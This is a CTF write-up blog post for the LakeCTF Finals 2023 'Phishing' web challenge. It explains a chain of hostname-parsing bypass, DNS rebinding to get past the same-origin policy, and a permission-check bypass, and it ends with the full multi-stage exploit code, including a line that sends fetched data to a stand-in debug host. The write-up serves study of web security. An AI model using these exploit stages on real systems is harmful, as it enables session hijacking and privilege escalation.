---

layout: post

title: "LakeCTF Finals 2023 - Phishing Writeup"

date: 2024-05-20

tag-name: xss dns rebinding sop-bypass 

---

Challenge Author: pilvar

## Introduction

There are quite a lot of files in this challenge. Below is reported a tree structure of it. Some files, like the Dockerfile, are removed for brevity.

```
.
├── fishing-bot/
│   ├── bot.py
│   └── main.py
└── fishing-web/
    ├── models/
    │   ├── post.js
    │   └── user.js
    ├── routes/
    │   ├── admin.js
    │   ├── auth.js
    │   ├── moderator.js
    │   └── posts.js
    ├── server.js
    └── views/
        ├── register.ejs
        ├── login.ejs
        ├── post.ejs
        ├── new-post.ejs
        ├── logs.ejs
        ├── index.ejs
        └── flag.ejs
```

The challenge emulates a scenario with a bot. Since this was an 8 hour CTF we tried to track down what we need to do in a really quick way.
We started by analyzing the bot's source code.

```python
def visit(postId):
  chrome_options=webdriver.ChromeOptions()
  chrome_options.add_argument("--headless")
  chrome_options.add_argument("--no-sandbox")
  driver = webdriver.Chrome(chrome_options=chrome_options)
  driver.get("http://fishing-web:3000/posts/"+postId)
  wait(driver, 3)
  driver.execute_script('document.querySelectorAll("a").forEach(a => {if (a.innerText == "[Login to view this content]") {a.click(); return}})')
  wait(driver, 3)
  if not driver.current_url.endswith("/login"):
    driver.quit()
    return
  usernameEl = driver.find_element_by_id("username")
  usernameEl.send_keys(os.environ['MODERATOR_USERNAME'])
  passwordEl = driver.find_element_by_id("password")
  passwordEl.send_keys(os.environ['MODERATOR_PASSWORD'])
  butEl = driver.find_element_by_id("submitbut")
  butEl.click()
  wait(driver, 10)
  driver.quit()
```

The bot code is pretty simple. All it does is:

- Visit one user supplied post
- Waits for 3 seconds
- Search in the DOM for all the <mark class="hltr-orange">anchor tags</mark> and click only on those which contains a certain string
- Waits for 3 seconds
- Checks if the current URL ends with `/login` and if it does, the bot inserts username and password and logs in
- Waits for 10 seconds

It's straightforward at this point that the post is our entrypoint for the exploit chain. Let's check how a post is created.

```javascript
create: (title, author, content) => {
        id = crypto.randomBytes(16).toString('hex')
        const insertPostQuery = `
            INSERT INTO posts (id, title, author, content, approved) VALUES (?, ?, ?, ?, ?)
        `;
        const window = new JSDOM('').window;
        const DOMPurify = createDOMPurify(window);
        const sanitizedContent = DOMPurify.sanitize(content, {ALLOWED_TAGS: ['a'], ALLOWED_ATTR: ['href']});
        return new Promise((resolve, reject) => {
            db.run(insertPostQuery, [id, title, author, sanitizedContent, false], function (err) {
                if (err) {
                    reject(err);
                } else {
                    resolve(id);
                }
            });
        });
    },
```

This is the function that is used to create a post. The content of the post is sanitized via <mark class="hltr-orange">DOMPurify</mark>. Moreover the only html tag allowed is the anchor tag with the href attribute.
This should not be a problem, because it's more than enough to trick the admin into a malicious link. Right?

Well, this is not that easy, otherwise it would have ended with more than 1 solve. 

```javascript
router.get('/:postId', async (req, res) => {
    const postId = req.params.postId;
    const isAuth = req.session.user && (await User.findByUsername(req.session.user)) && (await User.findByUsername(req.session.user)).permissions.includes('user')
    const isMod = req.session.user && (await User.findByUsername(req.session.user)) && (await User.findByUsername(req.session.user)).permissions.includes('moderator')
    try {
        const post = await Post.getById(postId);
        if (!post) {
            return res.status(404).send('Post not found');
        }

        const dom = new JSDOM("<p id=content>"+post.content+"</p>");
        const content = dom.window.document.getElementById('content');
        content.querySelectorAll('a').forEach(a => {
            try {
                if (parse(a.href).hostname !== parse(req.headers.host).hostname && !isAuth) {
                    a.text = "[Login to view this content]"
                    a.href = "/login";
                }
            } catch (e) {
                a.innerText = "[Login to view this content]"
                a.href = "/login";
            }
        });

        res.render('post', { post, content: content.innerHTML, isMod });
    } catch (error) {
        console.error(error);
        return res.status(500).send('Internal Server Error');
    }
});
```

This is the route responsible for showing a certain post. As you can see, the content of the post is inserted into a <mark class="hltr-orange">JSDOM</mark> object and parsed. 
The route checks if the href attribute of every anchor tag is the same as the host header for the current request.
If this check fails, the href is changed to `/login`.

How can we bypass this check? Is it really bypassable?

## Parsing Differential Made Easy

During the competition we weren't able to find errors in the parsing function. After the CTF i  reversed the exploit given by @pilvar and i've found out what exactly it's going on.

We have two parsers that take places here. Wait, what? The parser in the source code is only one, so why two?
This is indeed correct, but the second parsing is performed by <mark class="hltr-orange">Chromium</mark> when creating the HTML page.
Since we have two parsers maybe it's possible to have a parser differential. That is exactly what we were missing during the competition.

Chromium has this <mark class="hltr-orange">behaviour</mark> where it converts every `\` into `/` in the href of an anchor tag. I honestly don't know why it happens, maybe is related to some compatibility issues.
This is extremely interesting. That's because the forward slash character is used as terminator for the <mark class="hltr-orange">authority component</mark> of the URL, as stated [here](https://datatracker.ietf.org/doc/html/rfc3986#section-3.2). While the back slash character is considered a normal character, and it not have any special meaning

Consider the following example, using the same parse function used in the challenge.
The parse function is taken from the <mark class="hltr-orange">tldts</mark> library.

```javascript
> parse("http://example.com:9999\\@blig.one:8000/").hostname
"blig.one"
> parse("http://example.com:9999/@blig.one:8000/").hostname
"example.com" 
```

So, we know that Chromium performs this magic conversion automatically. We can leverage this behaviour to bypass the aforementioned check, with a payload like the following:

`\\\\exploit-domain:9999\\x@fishing-web:3000/../`

This will result in `fishing-web` as hostname when parsed server side, but on the browser the hostname will be our domain with the exploit. Thus, when the bot will click on the link will land on our <mark class="hltr-orange">malicious domain</mark>.

In a strict sense, this is not a parsing differential. Because the string parsed will not be the same on server-side and on the browser. Calling it <mark class="hltr-orange">Chromium hostname shenanigans</mark> would fit better.

## Phished. Now what?

Right now we can force the bot to visit our domain. If you recall what is the bot flow, if the domain ends with `/login` he writes his username and password. We can steal his credentials.
With his credentials we can impersonate the bot, right?

You guessed right. The answer is <mark class="hltr-orange">no</mark>

```javascript
router.post('/login', async (req, res) => {
    const { username, password } = req.body;
    if (typeof username !== 'string' || typeof password !== 'string') {
        return res.status(400).send('{"error":"Bad Request"}');
    }
    try {
        let user = await User.findByUsername(username);
        if (!user) {
            user = {}
            user.permissions = JSON.stringify(["user"])
            user.password = "$2b$10$XeKD8ih3RR3aZUA7iHhZfe.MiOKRfkf7ViY0qr2h2lv/AD9OU2msK" // error out but keep the bcrypt check to avoid side channel, this hash is not brute-foceable
        }
        user.permissions = JSON.parse(user.permissions)
        const match = await bcrypt.compare(password, user.password);
        if (match && user.ip == req.socket.remoteAddress.replace(/^.*:/, '')) {
            req.session.user = user.username;
            return res.status(200).send("{}");
        } else {
            return res.status(401).send('{"error":"Invalid username or password or ip"}');
        }
    } catch (error) {
        console.error(error);
        res.status(500).send('{"error":"Internal Server Error"}');
    }
});
```

When the user is created, among other information, the user IP is saved. When trying to perform a login there is a strict IP check.
This means that, even if we can steal the bot's credentials we cannot login with his profile. 

Ok, so maybe we can try to steal the cookie? Even this path is unfeasible, since the cookie is  <mark class="hltr-orange">SameSite=Strict</mark> and <mark class="hltr-orange">HttpOnly</mark>.

This is the second roadblock. The solution to this part is something that literally blew my mind. So get ready for <mark class="hltr-orange">DNS Rebinding</mark>.

## DNS Rebinding Made Not So Easy

One thing at a time. DNS Rebinding is a method of manipulating resolution of domain names.
The attacker registers a domain (such as local.blig.one) and delegates it to a DNS Server that is under the attacker's control. The server is configured to respond with a very short Time-To-Live (TTL), preventing the DNS response from being cached. When the victim browses to the malicious domain, the attacker's DNS server <mark class="hltr-orange">first responds</mark> with the IP address of a server hosting the malicious client-side code.

The malicious client-side code makes additional accesses to the original domain name (such as local.blig.one). These are permitted by the <mark class="hltr-orange">same-origin policy</mark>. However, when the victim's browser runs the script it makes a new DNS request for the domain, and the attacker replies with a new IP address. For instance, they could reply with an internal IP address or the IP address of a target somewhere else on the Internet.

With this trick is possible to bypass the SOP under some circumstances. While i've known about DNS Rebinding as a trick to apply while testing for SSRFs, i've never thought this could have been used for a SOP bypass.

But it's indeed possible. We just need to take a tiny shrewdness here. Apparently Chromium prefers <mark class="hltr-orange">local resolutions</mark> over remote ones. This means that if a certain domain responds with two A record the local IP address will be preferred over the remote one.

What we need is a second domain (let's say exploit.blig.one) that points only towards our exploit server. At this point the attack flow is the following:

- Phish the admin to exploit.blig.one
- The window opens another window via javascript
- The openee can redirect the opener to local.blig.one which is the domain that responds with two A record
- Since one of the two A record is the local IP of the bot, the bot will land on the challenge page and will perform the login.

Now we have a logged in bot, but the two opened windows are in cross origin since one is  local.blig.one and the other is exploit.blig.one.

## Phished. Rebinded. Now What ?

We cannot control that much inside the opened window on the challenge page. At this point the only advantage that we have is the fact that the bot is now logged in, but we cannot make him performing any sensitive actions. 

Since the two windows are in a openee-opener relationship, they both can redirect each other. If you recall how DNS Rebinding works, if we keep the same domain but we make it resolve to a different IP address we can theoretically bypass the SOP and maintain a valid cookie.

But, as said before, the domain local.blig.one will respond with two A record one of which is a local address for the bot.
We need to find a way that tricks the bot to prefer the remote IP over the local one.

In this challenge there is a gadget that helps us. 

```javascript
router.get('/logs', async (req, res) => {
    const logs = "Not implemented yet"
    res.render('logs', logs);
});
```

This route is in the  `moderator.js` file. While testing various thing with the application we have found out that, if a user with the required permission to hit this endpoint tries to navigate to it, the application crashes.
This is due to the fact that logs is a <mark class="hltr-orange">string</mark> and not an object.

Why this can help us? This is due to another Chromium quirk. Take this with a grain of salt, because i haven't dig deeper into this, but if a request that resolves with two A record fails on the first IP it is sent also to the second IP.

In our case this means that, if the local request fails, the same request will be sent on the remote IP, which hosts our exploit server.
The mind blown facts is that we are in same origin with the previous page.

## If you think about it very carefully, but for more than 8 hours

At this point it's similar to have an XSS in same origin with the challenge page. We force the bot to fetch the flag endpoint and we are done, aren't we?

You guessed right once again, the answer is <mark class="hltr-orange">indeed no</mark>.

Why? Because there are some countermeasures for this <mark class="hltr-orange">threat model</mark> inside Chrome. The quirk here is the fact that not all countermeasures outlined [here](https://wicg.github.io/private-network-access/) are already in place.

The neat part is the fact that while the Fetch API won't work in this situation, an <mark class="hltr-orange">iframe</mark> is not restricted by any means. Moreover, if a script tag is injected into an iframe it is possible to use the Fetch API normally. 
This research can be explored further [here](https://www.intruder.io/research/split-second-dns-rebinding-in-chrome-and-safari)

So, is it correct to say that all we need is to create an iframe? Yes, but actually no. If we will perform a fetch right now it will land on our exploit server, and we don't want that.

*But you said that the local resolutions are preferred over the remote ones.* 

That's indeed correct, but there is not only the DNS cache in place here. There is an inner Chrome cache that saves the previous resolutions. Again i didn't dig in the Chrome internal that much (yet), but that's my understanding.

To bypass this, we can use the same trick that we have used previously, but this time against ourselves. 
We can make our own server crash, so that the request will land on the challenge server, due to what i have explained before.

Is this the end, right?

## JS Shenanigans my beloved

Plot twist, the bot <mark class="hltr-orange">cannot fetch</mark> the flag. That's because this is the route that handles the flag rendering.

```javascript
router.use(async (req, res, next) => {
    if (!req.session.user || !(await User.findByUsername(req.session.user)) || !((await User.findByUsername(req.session.user)).permissions.includes('administrator'))) {
        return res.status(401).send('Unauthorized');
    }
    next();
});

router.get('/flag', async (req, res) => {
    res.render('flag', {flag: FLAG});
})
```

Only admin users can fetch the flag. Our bot is just a moderator, so he cannot fetch the flag himself.

By analyzing what the administrator can do, we came across this:

```javascript
router.post('/promote', async (req, res) => {
    const user = req.body.username;
    const permission = req.body.permission;
    if (typeof user !== 'string' || typeof permission !== 'string') {
        return res.status(400).send('{"error":"Bad Request"}');
    }
    if (permission.includes('administrator')) {
        return res.status(500).send('{"error":"Not allowed"}');
    }
    const currentPermissions = JSON.parse((await User.findByUsername(user)).permissions);
    const newPermissions = JSON.stringify([...currentPermissions, permission]);
    User.editPermission(user, newPermissions).then(() => {
        res.status(200).send('{}');
    }).catch(() => {
        res.status(500).send('{"error":"Internal Server Error"}');
    });
});
```

Apparently a moderator can promote an arbitrary user, giving the username. However the permission cannot include the administrator keyword.

Here is where the last magic happens. We pass the permission as a string, but then is stringified as an <mark class="hltr-orange">array</mark>. 
Later, when we try to hit the admin endpoint the <mark class="hltr-orange">string representation of the array</mark> is used to check if the administrator permission is present.
Did you notice the difference here? No? Me neither during the competition, but apparently there is.

The `includes` function behaves differently on the string representation of an array than on a simple string. 

```javascript
> "\u001administrator".includes("administrator")
< false
> JSON.stringify(["\u001administrator"]).includes("administrator")
< true
```

So, if we supply something like `\u001administrator` (but i guess it could be also `administratorr`) we can make false the first check, and true the second one.
This allow us to promote our user to admin, and finally <mark class="hltr-orange">get the flag</mark>.

## Phished the phishable. Rebinded the rebindable. JS tricked the JS trickable.

Now we have everything we need. Let's recap everything. We just need to setup two domains:

- `exploit.blig.one` points to our exploit server (i've used a VPS)
- `local.blig.one` responds with two A records, one is local to the bot and the other is the exploit server

Moreover on our exploit domain there will be two server running:

- At port 9999 there will be the starter of our chain. Its purpose is to kick off the exploit
- At port 3000 there will be our crasher server. The one responsible for crashing at a certain point in order to perform the DNS Rebinding magic

Once we have those setup we can go on with the exploit chain:

- Phish the admin via the parsing differential to `http://exploit.blig.one:9999/`
- `http://exploit.blig.one:9999/` will kick-off the first stage of our exploit. Which is a simple HTML page that will open another HTML page
- The newly opened HTML page is the <mark class="hltr-orange">stage-2</mark> of our exploit. This will redirect the opener window (the stage 1) to `http://local.blig.one:3000/login`. This will lead the bot to the login on the challenge page
- We wait for some time, in order to make the bot login normally. At this step it could be helpful to perform some dummy fetch operation in order to <mark class="hltr-orange">saturate</mark> the Chrome cache, and avoid any problems related to caching.
- After the waiting, from the <mark class="hltr-orange">stage-2 window</mark> we redirect the now login window to `http://local.blig.one:3000/moderator/logs`. This should crash the challenge server and make the same request to our exploit server. This will kick-off the stage 3.
- The stage 3 is responsible for <mark class="hltr-orange">crashing</mark> our own server and injecting the iframe with the fetch to the `/moderator/promote` endpoint with the `\u001administrator` payload
- After this is possible to login normally with our user, and retrieve the flag.

## The Reversed Exploit

All of this could not have been possible without the <mark class="hltr-orange">pilvar's writeup</mark> (and obviously with pilvar explaining me things)

Since i've fully reversed the exploit, i left here all the different stages and files needed to flag.

```python
# This is the submitter script.
# Its only purpose is to create the user, the post with the exploit and send everything to the admin.
import requests
import random
import string
import time

CHALLENGE_URL = "http://localhost:12008"
REPORT_URL = "http://localhost:12009"

# This URL resolves to where the backend of our exploit relies.
EXPLOIT_URL_TWO = "http://exploit.blig.one"

# Step 1. Create the user and perform the login.

def randomString(stringLength=16):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

s = requests.Session()
username = randomString()
x = s.post(f"{CHALLENGE_URL}/register",json={"username":username})
password = x.json()["password"]

print(f"Username: {username} Password: {password}")

s.get(f"{EXPLOIT_URL_TWO}:3000/username?username={username}")
print("Username sent to exploit server")

s.post(f"{CHALLENGE_URL}/login",json={"username":username, "password":password})

# Step 2. Create the post with the exploit.
#
# The exploit is subtle. We inject an anchor tag which will be clicked by the admin because it contains [Login to view this content].
# We need to bypass the host check.
# The host check is performed in this way:
#
# const { parse } = require('tldts');
# if (parse(a.href).hostname !== parse(req.headers.host).hostname && !isAuth) {
#   a.text = "[Login to view this content]"
#   a.href = "/login";
# }
#
# We need a way to trick the parser to think that we want the admin to click a safe link, but in reality is not.
# The way we can do it is by using the backslash char (\).
# Why? Because in javascript is treated as it is, while on chrome it gets converted to forward slash (/) when used in a link.
# This lead to a parser differential where the admin is phished to our domain.
#

data = {
    "title":"exploit",
    "content":f"""
        <a href='\\\\{EXPLOIT_URL_TWO.replace("http://","")}:9999\\x@fishing-web:3000/../'>[Login to view this content]</a>
    """
}

x = s.post(f"{CHALLENGE_URL}/posts",json=data)

postId = x.json()["postId"]

# Step 3. Submit the post to the admin.

s.post(f"{REPORT_URL}/submit", data={"postId":postId})

print(postId)

print("Now waiting for the admin to do all the stuff, hopefully we flag")
time.sleep(25)
x = s.get(f"{CHALLENGE_URL}/admin/flag")
print(x.text)
```

Below the two server used.

```javascript
const express = require('express')
const fs = require('fs')
const path = require('path')

/** 
 * This is the first out of two servers that we need to run in order to make our exploit work.
 * The whole purpose of this is to kick off the first stage of the exploit, that would lead to the second one.
 * Essentially this is serving files.
 */

const starter = express()
var port = 9999

starter.get('/', (req, res) => {
    console.log("Stage 1 starting")
    let filePath = path.join(__dirname, 'public/stage-1.html');
    fs.readFile(filePath, {encoding: 'utf-8'}, function(err,data){
        if (!err) {
            res.writeHead(200, {'Content-Type': 'text/html'});
            res.write(data);
            res.end();
        } else {
            console.log(err);
        }
    });
})

starter.get('/stage-two', (req, res) => {
    console.log("Stage 2 kicking in")
    let filePath = path.join(__dirname, 'public/stage-2.html');
    fs.readFile(filePath, {encoding: 'utf-8'}, function(err,data){
        if (!err) {
            res.writeHead(200, {'Content-Type': 'text/html'});
            res.write(data);
            res.end();
        } else {
            console.log(err);
        }
    });
})

starter.listen(port, () => {
  console.log(`Starter listening on port ${port}`)
})
```


```javascript
/** 
 * This is the second out of two servers that we need to run in order to make our exploit work.
 * The whole purpose of this is to kick off the third stage of the exploit.
 * In addition it has an endpoint that will make crash the entire application.
 * In addition it has a route that serve just for setting the username.
 * This is necessary to achieve a SOP bypass.
 */

const express = require('express')
const crasher = express()
crasher.set('view engine', 'ejs');
var port = 3000
var username = ""

crasher.get('/username', (req, res) => {
    username=req.query.username
    res.end()
})

crasher.get('/moderator/logs', (req, res) => {
    res.render("../public/stage-3.ejs",{"username":username})
})

crasher.get('/bye', (req, res) => {
    console.log("Stage 3 Started, killing this process")
    process.exit(1)
})

crasher.listen(port, () => {
    console.log(`Crasher listening on port ${port}`)
})
```

Last but not least all the HTML files used as stages

```html
<html>
    <head>Stage 1 of the Exploit</head>
    <body>
        <p>
            The only thing that this exploit does is to open the second stage.
        </p>
        <br/>
        <p>
            We need a dedicated page in order to redirect this page to /login, to bypass
            the check performed by the bot.
        </p>
    </body>
    <script>
        var tab = open("/stage-two","_blank")
    </script>
</html>
```

```html
<html>
    <script>
        const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

        async function exploit(){
            /* 
            * This changes the location of the opener (which is stage-1) to the login page.
            * Actually the URL sends two DNS A-Record, one for the challenge server and the other one for the exploit server.
            * The admin will land on the challenge page, because Chrome will prefer the local address over the remote one. 
            * Maybe since there are some DNS caching magic happening we can try to saturate the cache with random fetch in order to make the exploit more reliable.
            * The request to /moderator/logs will make the server crash. The browser will then perform the request to the other address as fallback.
            * On the other address there will be the third stage.
            */
            opener.location = "http://local.blig.one:3000/login"
            for (let i = 0; i < 60; i++) {
                await sleep(100);
                fetch('/nonexisting'+i)
	    }
            opener.location = "http://local.blig.one:3000/moderator/logs"
        }
    </script>
    <head>Stage 2 of the Exploit</head>
    <body onload="exploit()"></body>
</html>
```

The last one is actually an ejs template.

```html
<html>
    <head>Stage 3 of the Exploit</head>
    <script>
        const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

        function injectFunc(){
            fetch("/moderator/promote", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({ username: "<%= username %>", permission: "\u001administrator"})
                }
            ).then(e=>e.text()).then(e=>{fetch('http://dummy-domain-for-debug/?a='+e)})
        }

        function injectScript(frame) {
            let doc = frame.contentDocument || frame.contentWindow.document
            let iframe = document.createElement("iframe")
            iframe.srcdoc = `<script>${injectFunc.toString()}; injectFunc()<\x2fscript>`
            doc.body.append(iframe)
        }

        async function pwn(){
            /**
             * This fetch will kill our DNS Rebinding server.
             * This is because we need to perform the request in same-origin with the challenge server.
             * By killing our server, the request will go to the other A Record (which is the challenge URL).
             * Once again maybe we need to saturate the cache with some dummy fetch.
             * Then we can inject a script into the iframe.
            */
            fetch("/bye")
            for (let i = 0; i < 50; i++) {
                await sleep(100);
            }
            var frame = document.getElementById("frame")
            frame.src = window.location+"/../../login"
            await sleep(500)
            injectScript(frame)
        }
    </script>
    <body onload="pwn()">
        <iframe id="frame"></iframe>
    </body>
</html>
```


## Greetings

Really big thanks to pilvar both for dealing with me and for have created such an interesting challenge. I've learned a lot from it.

I won't talk regarding my overall experience at Lake Finals, but maybe there will be something around the end of the year :eyes:

